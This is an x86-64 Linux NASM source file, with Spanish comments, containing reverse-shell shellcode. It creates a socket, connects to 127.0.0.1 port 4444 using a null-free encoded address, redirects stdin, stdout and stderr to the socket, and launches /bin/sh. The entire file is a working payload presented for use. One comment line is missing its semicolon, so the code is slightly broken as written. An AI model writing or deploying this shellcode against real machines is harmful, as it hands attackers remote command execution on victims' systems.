;//////////Codigo por Belial Grimoire////////////
;/usr/include/x86_64-linux-gnu/asm/unistd_64.h

global _start


section .text

_start:

xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor r8, r8


push 0x2         ;int socket(int domain, int type, int protocol)
pop rdi
push 0x1
pop rsi
push 0x6
pop rdx
push 0x29       ;#define __NR_socket 41
pop rax

syscall

mov r8, rax

xor rsi, rsi
xor r10, r10

push r10                       ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
mov byte[rsp], 0x2
mov word[rsp+0x2], 0x5c11      ;puerto
mov rsi, 0x12111190            ;protocolo
sub rsi, 0x11111111            ;eliminar nulls para utilizarlo como opcodes
mov [rsp+0x4], rsi

mov rsi, rsp
push byte 0x10
pop rdx
push r8
pop rdi
push 0x2a                      ;#define __NR_connect 42
pop rax

syscall

xor rsi, rsi
push 0x3
pop rsi

dp:             int dup2(int oldfd, int newfd)  -> (send,recv,error)
dec rsi
push 0x21
pop rax
syscall
jne dp

xor rdi, rdi    ;int execve(const char *fn, char *const argv[], char *const envp[])
push rdi
push rdi
pop rsi
pop rdx
mov rdi, 0x68732f6e69622f2f   ;//bin/sh
shr rdi, 0x8
push rdi
push rsp
pop rdi
push 0x3b
pop rax
syscall


